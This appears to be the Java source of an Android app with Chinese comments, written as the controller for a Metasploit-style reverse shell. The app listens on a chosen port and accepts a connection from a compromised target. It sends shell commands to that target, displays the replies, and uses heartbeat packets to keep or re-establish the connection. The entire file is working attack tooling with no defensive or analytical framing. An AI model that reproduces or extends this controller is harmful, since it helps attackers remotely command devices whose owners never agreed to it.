package com.metasploit.shell.reverse;

import android.app.*;
import android.os.*;
import android.widget.*;
import java.net.*;
import java.io.*;
import android.view.View.*;
import android.view.*;
//这里也是payload.apk的内容，不是控制台
public class MainActivity extends Activity 
{EditText cmd,bind;
Button bind_port;
Button shell;
ScrollView scroll;
Socket socket;
ServerSocket serverSocket;
int port;//绑定的端口
String 
toast//toast显示的Str
,output//输出的Str
,send//发送的命令
;
TextView outPut;


	Handler handler=new Handler(){//利用执行器更新ui函数

		@Override
		public void handleMessage(Message msg)
		{switch(msg.what){
			case 1://输出outPut
				outPut.append("\n"+output);
				scroll.scrollTo(0,outPut.getHeight());
		}
			super.handleMessage(msg);
		}
	
};
    @Override
    protected void onCreate(Bundle savedInstanceState)
    {
        super.onCreate(savedInstanceState);
        setContentView(R.layout.main);
		scroll=findViewById(R.id.mainScrollView1);
		bind_port=findViewById(R.id.mainButton2);
		bind=findViewById(R.id.mainEditText2);
		shell=findViewById(R.id.mainButton1);
		cmd=findViewById(R.id.mainEditText1);
		outPut=findViewById(R.id.mainTextView1);
		socketTcp();
		bind_port.setOnClickListener(new OnClickListener(){

				@Override
				public void onClick(View p1)
				{
					if(!bind.getText().toString().equals("")){
					port=Integer.parseInt(bind.getText().toString());
					bindPort();
					outPuts("开始监听"+port+"端口...");
					}
				}
			});
		shell.setOnClickListener(new OnClickListener(){

				@Override
				public void onClick(View p1)
				{
					if(!bind.getText().toString().equals("")){
				send=cmd.getText().toString();
				
				sendShell();}
				else{toast("信息不完整");}
					// TODO: Implement this method
				}
			});
    }
	
	public void sendShell(){
		
		new Thread(new Runnable(){

				@Override
				public void run()
				{
					
					try
					{
						if(socket!=null){
						OutputStream os=socket.getOutputStream();
						os.write(send.getBytes());
						os.flush();
						outPuts("向目标发送了命令:"+send);}
						else{outPuts("socket还未获取实例对象");}
					}
					catch (IOException e)
					{toast("目标没有接收到心跳包，可能已下线");
					outPuts("目标没有接收到shell");}
					// TODO: Implement this method
				}
			}).start();
	}
	public void bindPort(){
		new Thread(new Runnable(){//建立一个用来接收tcp的线程

				@Override
				public void run()
				{try
					{
						serverSocket = new ServerSocket(port);//建立1557端口的监听
						socket = serverSocket.accept();
						toast("接收到Tcp包:From "+socket.getInetAddress().toString());
						outPuts("目标:"+socket.getInetAddress().toString()+"连接至本机");
					}
					catch (IOException e)
					{}//放行端口
					// TODO: Implement this method
				}
			}).start();
	}
	
	public void socketTcp(){
		final Thread thread;
		thread = new Thread(new Runnable(){

				@Override
				public void run()
				{try
					{
						InputStream in=socket.getInputStream();
						int len;
						byte[] b=new byte[1024];
						while((len=in.read(b))!=-1){
							outPuts(new String(b,0,len));
						}
					}
					catch (IOException e)
					{}
					// TODO: Implement this method
				}
			});

		//c.线程启动后是不能再次启动的，除非线程已死，才能再次调用run()方法使线程重新运转
		new Thread(new Runnable(){//检查socket是否开启

				@Override
				public void run()
				{while(true){
					if(socket!=null){
						try
						{
							socket.sendUrgentData(0xFF);//发送心跳包
							if(!thread.isAlive()){//判断线程死活
								if(thread.getState()==Thread.State.NEW){//判断新建立的线程是否启动
									thread.start();}else{thread.run();}}
						}
						catch (IOException e)
						{//若跑出异常，执行下一句
							try
							{
								//实现服务不死利用toast通知栏提升服务优先级
								toast("对方似乎下线,重连...");
								//outPuts(socket.getInetAddress().toString()+" 下线");
								socket = serverSocket.accept();
								outPuts(socket.getInetAddress().toString()+" 重连至本机");
								toast("重连成功");
							}
							catch (IOException e1)
							{}

						}
					}
						try
						{
							Thread.sleep(1000);
						}
						catch (InterruptedException e)
						{}
					}
					
				}
			}).start();
		
	}
	public void outPuts(String out){//输出outPut
		Message msg=new Message();
	output=out;
	msg.what=1;
	handler.sendMessage(msg);
	}
	
	public void toast(String str){//显示toast
		toast=str;
		runOnUiThread(new Runnable(){

				@Override
				public void run()
				{Toast.makeText(MainActivity.this,toast,Toast.LENGTH_SHORT).show();
					
					// TODO: Implement this method
				}
			});
		}
}
